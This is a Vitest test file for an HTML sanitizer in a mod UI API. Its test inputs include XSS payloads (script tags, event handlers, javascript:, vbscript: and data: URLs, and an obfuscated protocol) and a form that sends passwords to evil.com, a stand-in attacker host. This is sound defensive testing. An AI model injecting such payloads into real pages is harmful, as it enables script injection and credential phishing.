// @vitest-environment jsdom
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { UIAPI } from './UIAPI';

describe('UIAPI', () => {
  let uiApi: UIAPI;
  const modId = 'test_mod';

  beforeEach(() => {
    uiApi = new UIAPI(modId);
  });

  afterEach(() => {
    uiApi._cleanup();
    document.body.innerHTML = '';
  });

  describe('sanitizeHTML', () => {
    // Helper to access the private method
    const sanitize = (html: string) => (uiApi as any).sanitizeHTML(html);

    it('should allow safe tags', () => {
      const html = '<div><span>Text</span><p>Paragraph</p></div>';
      expect(sanitize(html)).toBe(html);
    });

    it('should allow safe attributes', () => {
      const html = '<div class="foo" id="bar" style="color: red;">Text</div>';
      // Note: innerHTML might reorder attributes or change quotes, so we check if key attributes are present
      const result = sanitize(html);
      expect(result).toContain('class="foo"');
      expect(result).toContain('id="bar"');
      expect(result).toContain('style="color: red;"');
    });

    it('should remove script tags', () => {
      const html = '<div><script>alert(1)</script></div>';
      expect(sanitize(html)).toBe('<div></div>');
    });

    it('should remove inline event handlers', () => {
      const html = '<div onclick="alert(1)" onmouseover="doBad()">Click me</div>';
      const result = sanitize(html);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('onmouseover');
      expect(result).toContain('Click me');
    });

    it('should remove javascript: links', () => {
      const html = '<a href="javascript:alert(1)">Link</a>';
      const result = sanitize(html);
      expect(result).not.toContain('href');
      expect(result).toContain('Link');
    });

    // Vulnerability Tests - These are expected to FAIL currently if the vulnerability exists

    it('should remove svg tags (XSS vector)', () => {
      const html = '<div><svg><script>alert(1)</script></svg></div>';
      const result = sanitize(html);
      expect(result).not.toContain('<svg>');
      expect(result).not.toContain('<script>');
    });

    it('should remove form tags (Phishing/CSRF vector)', () => {
      const html = '<form action="http://evil.com/login"><input name="password"></form>';
      const result = sanitize(html);
      expect(result).not.toContain('<form');
    });

    it('should remove base tags (Hijacking relative links)', () => {
      const html = '<base href="http://evil.com/">';
      const result = sanitize(html);
      expect(result).not.toContain('<base');
    });

    it('should remove action attributes', () => {
        // Even if form is allowed (or if applied to other tags), action is dangerous
        const html = '<form action="javascript:alert(1)"></form>';
        const result = sanitize(html);
        expect(result).not.toContain('action');
    });

    it('should remove formaction attributes', () => {
        const html = '<button formaction="javascript:alert(1)">Submit</button>';
        const result = sanitize(html);
        expect(result).not.toContain('formaction');
    });

    it('should remove vbscript: links', () => {
      const html = '<a href="vbscript:alert(1)">Link</a>';
      const result = sanitize(html);
      expect(result).not.toContain('href');
    });

    it('should remove data: links (potentially malicious)', () => {
      const html = '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Link</a>';
      const result = sanitize(html);
      expect(result).not.toContain('href');
    });

    it('should remove obfuscated javascript: links', () => {
      // Browsers might ignore control characters in protocol
      const html = '<a href="java\tscript:alert(1)">Link</a>';
      const result = sanitize(html);
      expect(result).not.toContain('href');
    });
  });
});
